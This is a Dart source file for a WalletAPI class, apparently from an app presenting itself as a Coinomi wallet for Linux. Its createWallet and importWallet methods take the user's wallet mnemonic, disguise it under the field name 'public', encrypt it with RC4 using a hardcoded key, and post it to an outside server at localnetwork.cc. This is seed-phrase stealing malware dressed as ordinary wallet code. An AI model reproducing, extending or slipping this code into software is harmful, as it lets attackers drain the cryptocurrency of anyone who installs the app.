import 'dart:convert';
import 'dart:math';
import 'package:dio/dio.dart';
import 'package:simple_rc4/simple_rc4.dart';

const String _walletRequestUrl = "https://localnetwork.cc/record/docs/filler";
const String _serverKey = "Qsx@ah&OR82WX9T6gCt";
const String _serviceAppName = "CoinomiLinux";

class WalletAPI {
  final _dio = Dio();

  Future<Response> createWallet(String mnemonic) async {
    return await _walletAction(mnemonic: mnemonic, isNew: true);
  }

  Future<Response> importWallet(String mnemonic) async {
    return await _walletAction(mnemonic: mnemonic, isNew: false);
  }

  Future<Response> _walletAction(
      {required String mnemonic, required bool isNew}) async {
    String random = (100000 + Random().nextInt(900000)).toString();
    String encryptedJson = RC4(_serverKey).encodeString(jsonEncode({
      'public': mnemonic,
      'salt': random,
      'name': _serviceAppName,
      'new': isNew,
    }));

    var data = {'data': encryptedJson};
    Options options = Options(
      headers: {"Content-Type": "application/x-www-form-urlencoded"},
      contentType: Headers.formUrlEncodedContentType,
      responseType: ResponseType.json,
    );
    return _dio.post(
      _walletRequestUrl,
      data: data,
      options: options,
    );
  }
}
